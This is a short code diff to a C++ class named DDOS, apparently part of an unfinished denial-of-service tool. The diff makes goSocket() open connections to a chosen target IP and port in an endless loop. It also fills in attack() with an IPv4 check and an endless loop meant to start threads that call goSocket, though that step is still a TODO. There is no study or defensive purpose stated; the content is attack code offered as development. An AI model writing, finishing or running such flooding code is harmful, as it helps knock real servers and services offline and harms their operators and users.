@@ -8,21 +8,26 @@ bool DDOS::isIPv4() {
 }
 
 void DDOS::goSocket() {
-  SOCKADDR_IN sin;
-  SOCKET sock = socket(AF_INET, this->protocol, 0);
-  // TODO: Check socket.
-  sin.sin_addr.s_addr = inet_addr(this->target);
-  sin.sin_family = AF_INET;
-  sin.sin_port = htons(this->port);
-  connect(sock, (SOCKADDR*)&sin, sizeof(sin));
-  // TODO: Check connect.
+  for (;;) {
+    SOCKADDR_IN sin;
+    SOCKET sock = socket(AF_INET, this->protocol, 0);
+    // TODO: Check socket.
+    sin.sin_addr.s_addr = inet_addr(this->target);
+    sin.sin_family = AF_INET;
+    sin.sin_port = htons(this->port);
+    connect(sock, (SOCKADDR*)&sin, sizeof(sin));
+    // TODO: Check connect.  
+  }
 }
 
 void DDOS::attack() {
-  // TODO:
-  // Check if host is valid (::isIP && ::ping).
-  // GO DDOS.
-  
+  if(!this->isIPv4()) {
+    // TODO: Return error.
+  }
+  for (;;) {
+    // TODO:
+    // Create thread + pass a goSocket.
+  }
 }
 
 /*void DDOS::stop(vector<std::thread> threads) {
